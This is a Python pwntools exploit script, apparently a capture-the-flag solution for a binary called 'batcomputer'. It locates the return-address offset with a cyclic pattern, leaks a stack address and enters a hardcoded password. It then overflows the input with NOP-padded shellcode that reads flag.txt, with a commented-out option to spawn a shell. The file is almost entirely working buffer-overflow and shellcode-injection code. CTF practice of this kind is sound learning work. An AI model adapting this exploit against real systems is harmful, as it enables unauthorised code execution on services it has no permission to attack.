from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


def find_ip(payload):
    p = process(exe)
    p.sendlineafter('>', '2')  # Chase joker
    p.sendlineafter('Enter the password:', 'b4tp@$$w0rd!')  # Enter password
    p.sendlineafter('Enter the navigation commands:', payload)  # Cyclic pattern
    p.sendlineafter('>', '420')  # Enter invalid option to trigger return
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
breakrva 0x0000131f
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './batcomputer'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(100))

# Start program
io = start()

# Get the stack address (where out navigation commands will go)
io.sendlineafter('>', '1')
stack_addr = int(re.search(r"(0x[\w\d]+)", io.recvlineS()).group(0), 16)
info("leaked stack_addr: %#x", stack_addr)

# Need to pop registers at the beginning to make room on stack
shellcode = asm(shellcraft.popad())
# Build shellcode (cat flag.txt or spawn shell)
# shellcode += asm(shellcraft.sh())
shellcode += asm(shellcraft.cat('flag.txt'))
# Pad shellcode with NOPs until we get to return address
padding = asm('nop') * (offset - len(shellcode))

# Build the payload
payload = flat([
    padding,
    shellcode,
    stack_addr
])

io.sendlineafter('>', '2')  # Chase joker
io.sendlineafter('Enter the password:', 'b4tp@$$w0rd!')  # Enter password

io.sendlineafter('Enter the navigation commands:', payload)  # Inject payload

# Enter invalid option to trigger return (jump to our stack_addr)
io.sendlineafter('>', '420')
io.recvuntil("Too bad, now who's gonna save Gotham? Alfred?\n")

# Get our flag!
flag = io.recv()
success(flag)

# Or, spawn a shell
# io.interactive()
